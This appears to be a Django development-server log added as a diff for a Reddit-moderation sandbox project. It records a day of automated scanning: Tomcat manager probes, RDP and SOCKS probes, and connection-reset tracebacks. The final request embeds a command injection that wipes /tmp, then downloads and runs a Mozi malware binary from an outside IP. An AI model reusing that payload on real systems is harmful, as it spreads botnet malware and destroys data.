+[24/Jan/2021 08:41:55] "HEAD /vXY6 HTTP/1.1" 404 8717
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:09:18:21 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:09:18:21 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 09:18:21] "GET /manager/html HTTP/1.1" 400 66140
+Not Found: /admin/connection/
+2021-01-24:09:44:18 WARNING [log.py:log_response:L230] Not Found: /admin/connection/
+[24/Jan/2021 09:44:18] "GET /admin/connection/ HTTP/1.1" 404 8755
+Not Found: /favicon.ico
+2021-01-24:09:44:19 WARNING [log.py:log_response:L230] Not Found: /favicon.ico
+[24/Jan/2021 09:44:19] "GET /favicon.ico HTTP/1.1" 404 8737
+----------------------------------------
+Exception happened during processing of request from ('178.128.171.59', 44310)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[24/Jan/2021 09:47:55] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 09:47:55] "  /*à     Cookie: mstshash=Administr" 400 -
+Not Found: /admin/connection/
+2021-01-24:09:53:17 WARNING [log.py:log_response:L230] Not Found: /admin/connection/
+[24/Jan/2021 09:53:17] "GET /admin/connection/ HTTP/1.1" 404 8755
+Not Found: /favicon.ico
+2021-01-24:09:53:18 WARNING [log.py:log_response:L230] Not Found: /favicon.ico
+[24/Jan/2021 09:53:18] "GET /favicon.ico HTTP/1.1" 404 8737
+----------------------------------------
+Exception happened during processing of request from ('209.97.187.124', 52238)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:09:56:16 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:09:56:16 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 09:56:16] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:10:14:03 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:10:14:04 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 10:14:04] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:11:07:03 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:11:07:03 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 11:07:03] "GET /manager/html HTTP/1.1" 400 66140
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[24/Jan/2021 11:07:03] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('205.185.121.138', 53448)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:11:09:48 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:11:09:48 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 11:09:48] "GET /manager/html HTTP/1.1" 400 66139
+[24/Jan/2021 11:25:31] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 11:25:31] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:11:51:31 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:11:51:31 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 11:51:31] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:12:48:49 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:12:48:49 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 12:48:49] "GET /manager/html HTTP/1.1" 400 66140
+[24/Jan/2021 12:59:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 12:59:48] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:13:45:27 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:13:45:27 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 13:45:28] "GET /manager/html HTTP/1.1" 400 66138
+Not Found: /config/getuser
+2021-01-24:13:58:54 WARNING [log.py:log_response:L230] Not Found: /config/getuser
+[24/Jan/2021 13:58:54] "GET /config/getuser?index=0 HTTP/1.1" 404 8754
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:14:01:17 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:14:01:17 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 14:01:17] "GET /manager/html HTTP/1.1" 400 66139
+[24/Jan/2021 14:26:39] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 14:26:39] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:15:12:31 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:15:12:31 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 15:12:31] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:15:17:41 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:15:17:41 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 15:17:41] "GET /manager/html HTTP/1.1" 400 66138
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.40', 53732)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[24/Jan/2021 15:48:48] "GET / HTTP/1.1" 200 81
+----------------------------------------
+Exception happened during processing of request from ('162.142.125.40', 54630)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[24/Jan/2021 15:48:48] "GET / HTTP/1.1" 200 81
+[24/Jan/2021 15:49:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 15:49:44] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:16:16:48 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:16:16:48 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 16:16:48] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:16:49:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:16:49:39 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 16:49:39] "GET /manager/html HTTP/1.1" 400 66139
+[24/Jan/2021 16:57:17] "GET / HTTP/1.1" 200 71
+[24/Jan/2021 17:00:17] "GET / HTTP/1.1" 200 81
+[24/Jan/2021 17:05:59] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 17:05:59] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:17:06:38 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:17:06:38 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 17:06:38] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:17:28:17 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:17:28:17 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 17:28:17] "GET /manager/html HTTP/1.1" 400 66140
+[24/Jan/2021 17:56:49] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 17:56:49] "  /*à     Cookie: mstshash=Administr" 400 -
+[24/Jan/2021 18:21:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 18:21:58] "  /*à     Cookie: mstshash=Administr" 400 -
+[24/Jan/2021 18:41:39] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:18:54:26 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:18:54:27 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 18:54:27] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:19:09:23 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:19:09:23 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 19:09:23] "GET /manager/html HTTP/1.1" 400 66140
+[24/Jan/2021 19:34:35] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 19:34:35] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:19:39:41 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:19:39:41 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 19:39:41] "GET /manager/html HTTP/1.1" 400 66139
+[24/Jan/2021 20:41:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 20:41:44] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:21:42:02 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:21:42:02 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 21:42:02] "GET /manager/html HTTP/1.1" 400 66140
+[24/Jan/2021 21:46:17] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[24/Jan/2021 21:46:17] "  /*à     Cookie: mstshash=Administr" 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:22:30:30 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:22:30:30 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 22:30:30] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:23:19:13 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:23:19:13 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 23:19:13] "GET /manager/html HTTP/1.1" 400 66140
+[24/Jan/2021 23:28:14] "GET / HTTP/1.1" 200 81
+[24/Jan/2021 23:38:27] code 400, message Bad HTTP/0.9 request type ('\x00\x0e8\x92Êe')
+[24/Jan/2021 23:38:27] " 8Êeûè     " 400 -
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:23:46:24 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-24:23:46:24 WARNING [log.py:log_response:L230] Bad Request: /script
+[24/Jan/2021 23:46:24] "GET /script HTTP/1.1" 400 66073
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:00:12:50 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:00:12:50 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 00:12:50] "GET /manager/html HTTP/1.1" 400 66140
+[25/Jan/2021 00:34:41] "GET / HTTP/1.0" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:01:05:33 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:01:05:33 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 01:05:33] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:01:16:02 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:01:16:02 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 01:16:02] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:01:20:53 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:01:20:53 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 01:20:53] "GET /manager/html HTTP/1.1" 400 66138
+[25/Jan/2021 01:26:34] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-25:02:40:24 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-25:02:40:24 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[25/Jan/2021 02:40:24] "GET /manager/html HTTP/1.1" 400 66140
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[25/Jan/2021 02:40:24] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('205.185.121.138', 48504)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-25:02:50:17 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-25:02:50:17 WARNING [log.py:log_response:L230] Bad Request: /
+[25/Jan/2021 02:50:30] "GET / HTTP/1.0" 400 66834
+[25/Jan/2021 02:58:41] code 400, message Bad request syntax ('\x04\x01\x00\x19h/;¡\x00')
+[25/Jan/2021 02:58:41] " h/;¡ " 400 -
+[25/Jan/2021 02:58:41,163] - Broken pipe from ('80.82.65.74', 33862)
+
+[25/Jan/2021 02:59:41] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jan/2021 02:59:41] " " 400 -
+[25/Jan/2021 02:59:41,442] - Broken pipe from ('80.82.65.74', 52986)
+
+[25/Jan/2021 03:00:41] code 400, message Bad request syntax ('\x05\x01\x00')
+[25/Jan/2021 03:00:41] " " 400 -
+[25/Jan/2021 03:00:41,726] - Broken pipe from ('80.82.65.74', 47558)
+
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-25:03:12:25 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-25:03:12:25 WARNING [log.py:log_response:L230] Bad Request: /
+[25/Jan/2021 03:12:54] "GET / HTTP/1.1" 400 66384
+[25/Jan/2021 03:15:52] "OPTIONS /rest-auth/user/ HTTP/1.1" 200 0
+[25/Jan/2021 03:15:52] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[25/Jan/2021 03:15:52] "OPTIONS /reddit_logged HTTP/1.1" 200 0
+[25/Jan/2021 03:15:52] "OPTIONS /reddit_logged/ HTTP/1.1" 200 0
+[25/Jan/2021 03:15:52] "GET /reddit_logged/ HTTP/1.1" 200 4
+[25/Jan/2021 03:15:52] "GET /rest-auth/user/ HTTP/1.1" 200 71
+[25/Jan/2021 03:15:52] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 0
+[25/Jan/2021 03:15:52] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 0
+[25/Jan/2021 03:15:52] "GET /reddit_logged/ HTTP/1.1" 200 4
+[25/Jan/2021 03:15:52] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[25/Jan/2021 03:15:52] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+[25/Jan/2021 03:15:52] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 5304
+[25/Jan/2021 03:15:52] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6968
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-25:03:57:32 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /board.cgi
+2021-01-25:03:57:32 WARNING [log.py:log_response:L230] Bad Request: /board.cgi
+[25/Jan/2021 03:57:32] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://59.97.174.101:34150/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 400 68013
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
